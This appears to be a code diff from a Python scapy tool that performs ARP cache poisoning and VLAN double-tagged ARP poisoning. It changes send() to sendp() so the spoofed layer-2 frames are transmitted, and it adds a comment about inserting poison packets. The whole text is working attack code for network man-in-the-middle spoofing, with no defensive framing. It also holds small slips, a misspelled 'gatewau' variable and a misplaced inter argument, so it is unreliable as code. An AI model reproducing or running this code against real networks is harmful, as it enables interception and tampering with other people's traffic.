@@ -62,13 +62,13 @@ console = Console()
             console.print("[blue]ARP Poisoning completed. Press Ctrl+C to stop.")
     except Exception as e:
         console.print("[red]Failed to Send Poisoning Packets. Please Try Again. \n") """
-    
+    # scapy poison packet insertions under layer2 protocol 
 def arp_cache_poison():
-    send(Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),
+    sendp(Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),
         inter=RandNum(10,40), loop=1)
 
 def arp_vlan_poison():
-    send(Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
+    sendp(Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
         /ARP(op="who-has", psrc=gatewau, pdst=client,
         inter=RandNum(10,40)))
 
